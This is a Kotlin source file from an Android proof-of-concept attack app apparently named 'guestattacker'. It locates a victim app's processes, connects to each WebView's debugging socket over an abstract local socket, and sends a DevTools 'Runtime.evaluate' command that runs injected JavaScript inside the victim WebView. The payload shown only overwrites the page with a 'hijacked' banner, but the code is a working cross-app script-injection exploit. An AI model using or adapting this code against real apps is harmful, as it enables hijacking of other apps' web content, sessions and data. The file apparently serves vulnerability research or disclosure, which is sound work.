package com.virtualxposed.guestattacker

import android.app.ActivityManager
import android.content.Context
import android.content.Context.ACTIVITY_SERVICE
import android.net.LocalSocket
import android.net.LocalSocketAddress
import com.virtualxposed.guestattacker.StorageBypass.VICTIM_APP
import com.virtualxposed.guestattacker.Utils.toast
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.filterNotNull
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.io.InputStream
import java.io.OutputStream
import java.net.InetAddress
import java.net.Socket
import java.net.SocketAddress
import java.util.concurrent.atomic.AtomicBoolean
import javax.net.SocketFactory
import okhttp3.OkHttpClient
import okhttp3.Request
import okio.ByteString
import org.json.JSONArray
import org.json.JSONObject
import kotlin.time.Duration.Companion.seconds

object WebviewHijack {

    // Make it possible for OkHttp to talk over local socket
    private class AndroidLocalSocketWrapper(
        private val socketName: String,
        private val namespace: LocalSocketAddress.Namespace = LocalSocketAddress.Namespace.ABSTRACT
    ) : Socket() {
        private val localSocket = LocalSocket()
        private val isConnectedState = AtomicBoolean(false)
        private val isClosedState = AtomicBoolean(false)

        override fun connect(endpoint: SocketAddress?, timeout: Int) {
            localSocket.connect(LocalSocketAddress(socketName, namespace))
            isConnectedState.set(true)
        }

        override fun getInputStream(): InputStream = localSocket.inputStream

        override fun getOutputStream(): OutputStream = localSocket.outputStream

        override fun close() {
            if (isClosedState.compareAndSet(false, true)) {
                isConnectedState.set(false)
                localSocket.close()
            }
        }

        // Avoiding unsupported LocalSocket calls
        override fun isConnected(): Boolean = isConnectedState.get()
        override fun isClosed(): Boolean = isClosedState.get()
        override fun isInputShutdown(): Boolean = isClosedState.get()
        override fun isOutputShutdown(): Boolean = isClosedState.get()

        // Provide dummy address values to prevent NullPointerExceptions in OkHttp logging/metrics
        override fun getInetAddress(): InetAddress = InetAddress.getLoopbackAddress()
        override fun getPort(): Int = 80
        override fun getLocalPort(): Int = 0
    }

    private class AndroidLocalSocketFactory(
        private val socketName: String
    ) : SocketFactory() {

        override fun createSocket(): Socket {
            return AndroidLocalSocketWrapper(socketName)
        }

        override fun createSocket(host: String?, port: Int): Socket = createSocket()
        override fun createSocket(
            host: String?,
            port: Int,
            localHost: InetAddress?,
            localPort: Int
        ): Socket = createSocket()

        override fun createSocket(host: InetAddress?, port: Int): Socket = createSocket()
        override fun createSocket(
            address: InetAddress?,
            port: Int,
            localAddress: InetAddress?,
            localPort: Int
        ): Socket = createSocket()
    }

    private class BasicWebSocketListener(val payload: String) : WebSocketListener() {
        val responseMessage = MutableStateFlow<String?>(null)

        override fun onOpen(webSocket: WebSocket, response: Response) {
            println("Connected!")
            webSocket.send(payload)
        }

        override fun onMessage(webSocket: WebSocket, text: String) {
            println("Received text: $text")
            responseMessage.tryEmit(text)
        }

        override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
        }

        override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
            webSocket.close(1000, null)
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            println("Error: ${t.message}")
        }
    }

    private suspend fun hijackWebviewSocket(pid: Int): Boolean {
        val socketName = "webview_devtools_remote_${pid}"

        val client = OkHttpClient.Builder()
            .socketFactory(AndroidLocalSocketFactory(socketName))
            .build()

        return try {
            // GET /json/list to fetch active WebView targets
            val listRequest = Request.Builder()
                .url("http://localhost/json/list")
                .build()

            val listResponse = client.newCall(listRequest).execute()
            val responseBody = listResponse.body.string()

            val targets = JSONArray(responseBody)
            if (targets.length() == 0) return false

            // Get the target ID for the active page
            val targetId = targets.getJSONObject(0).getString("id")

            val command = """
                document.body.innerHTML = '<div style="display:grid;place-items:center;height:100vh;margin:0;font-family:sans-serif;font-size:2rem;font-weight:bold;">WebView hijacked by guest attacker</div>';
            """.trimIndent()

            val cdpPayload = JSONObject().apply {
                put("id", 1)
                put("method", "Runtime.evaluate")
                put("params", JSONObject().apply {
                    put("expression", command)
                })
            }

            val listener = BasicWebSocketListener(cdpPayload.toString())

            val navigateRequest = Request.Builder()
                .url("http://localhost/devtools/page/$targetId")
                .get()
                .build()

            client.newWebSocket(navigateRequest, listener)

            val response = withTimeoutOrNull(10.seconds) {
                listener.responseMessage.filterNotNull().first()
            }

            response != null
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    suspend fun hijack(context: Context): Boolean {
        val activityManager = context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val procInfos = activityManager.runningAppProcesses

        val victimProcesses = procInfos.filter { it.processName == VICTIM_APP }

        val success = victimProcesses.any {
            hijackWebviewSocket(it.pid)
        }

        if (success) {
            toast(context, "Successfully hijacked the victim app WebView")
        } else if (victimProcesses.isEmpty()) {
            toast(context, "No victim process found. Start one to hijack its WebView")
        } else {
            toast(context, "Unable connect to the WebView debugger")
        }

        return success
    }
}
